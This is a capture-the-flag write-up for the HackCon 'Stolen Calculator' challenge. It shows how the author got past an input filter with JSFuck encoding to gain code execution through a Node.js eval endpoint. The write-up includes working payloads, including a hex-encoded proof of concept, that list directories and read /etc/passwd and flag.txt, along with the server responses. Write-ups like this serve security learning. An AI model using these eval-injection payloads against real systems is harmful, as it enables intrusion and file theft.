# Stolen Calculator - PWN (HackCon ctf)

Description: 
### I stole this calculator from someone and made some changes because I am the plagiarism god. Bow before me now. btw wanna try it: http://defcon.org.in:9080/ Hint: This is a pwn challenge

Here we have calculator:


![](http://s016.radikal.ru/i336/1708/c3/ba35c0dd3e53.png)

If we look at calculator source code, we will see hardcoded url : 
``` urll = "http://defcon.org.in:10300/" + encodeURIComponent( strrr ); ```
But this code will never run, because there was a mistake in js file. So lets try request  this url in burp:

![](http://s019.radikal.ru/i618/1708/32/98b0f49eb8f4.png)

If we try to ``` GET /1+1 ``` we will receive 
```HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1
ETag: W/"1-2kuSN7rMzfGcB2DKt67EqDWQELA"
Date: Wed, 30 Aug 2017 11:03:43 GMT
Connection: close

2
```

If we request some string, we will get 
```HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 3
ETag: W/"3-6zXDIdaZfDRIgpYriqHNCTmxI+E"
Date: Wed, 30 Aug 2017 11:05:08 GMT
Connection: close

err 
```
We can notice that there is eval node.js on other side by sending ``` $ ```
```
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 965
Date: Wed, 30 Aug 2017 11:06:21 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: $ is not defined<br> &nbsp; &nbsp;at eval (eval at &lt;anonymous&gt; (/bf.js:21:17), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at /bf.js:21:17<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at param (/node_modules/express/lib/router/index.js:354:14)<br> &nbsp; &nbsp;at param (/node_modules/express/lib/router/index.js:365:14)<br> &nbsp; &nbsp;at Function.process_params (/node_modules/express/lib/router/index.js:410:3)</pre>
</body>
</html>
```
So WAF is blocking any string we send, but if send ``` ({}) ``` we will receive 
``` HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 15
ETag: W/"f-wdRP8Dr/E3KFbCgYVPRU4uHRW3w"
Date: Wed, 30 Aug 2017 11:08:24 GMT
Connection: close

[object Object]
```
So lets try to use JSFuck to bypass this WAF. We can convert any javascript to JSFuck with help of http://www.jsfuck.com . If we send ``` return  process.argv ```
, in JSFuck it will look like ``` GET /[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]..... ``` and so on.
We will receive ``` /usr/local/bin/node,/bf.js ```. We have RCE. 

We cant send ```require``` because it is not defined. But we can use ``` process.binding ``` instead to read/write.
But we have strong restriction in node.js. We can send get request no larger than 80kb. And if we try to send ```buffer = Buffer.allocUnsafe(8192); process.binding('fs').read(process.binding('fs').open('/etc/passwd', 0, 0600), buffer, 0, 4096); return buffer ``` coverted to JSFuck , it will be 93369 bytes. I tried somehow to compress it, but length was still >85000.

The solution here is to use base64 or hex encode/decode and use ``` process.binding('fs').readdir('/')``` in js. Base64 will not work because there are a lot of letters in encoding , and they will be converted in larger pieces.
Convert ``` d=process.binding('fs').readdir('/etc/', 0, 0600);d; ``` to ascii hex. We will get ``` 643d70726f636573732e62696e64696e672827667327292e7265616464697228272f272c20302c2030363030293b643b```
Convert ``` var a = new Buffer("643d70726f636573732e62696e64696e672827667327292e7265616464697228272f272c20302c2030363030293b643b", "hex").toString();b = eval(a.toString()); return b``` to JSFuck and we will get 47651 chars. If we send them, we will get responce 

``` HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 152
ETag: W/"98-P8Y7q+l1+xsDl9SL2vRfvqsKG3o"
Date: Wed, 30 Aug 2017 11:33:54 GMT
Connection: close

.dockerenv,bf.js,bin,boot,dev,etc,flag.txt,home,lib,lib64,media,mnt,node_modules,opt,package-lock.json,proc,root,run,sbin,srv,startup.sh,sys,tmp,usr,var
```
Now we must read flag.txt using ```process.binding('fs').open('flag.txt', 0, 0600)```. 

## POC: 
```var a = new Buffer("627566666572203d204275666665722e616c6c6f63556e736166652838313932293b2070726f636573732e62696e64696e672827667327292e726561642870726f636573732e62696e64696e672827667327292e6f70656e2827666c61672e747874272c20302c2030363030292c206275666665722c20302c2034303936293b2020627566666572", "hex").toString();b = eval(a.toString()); return b```
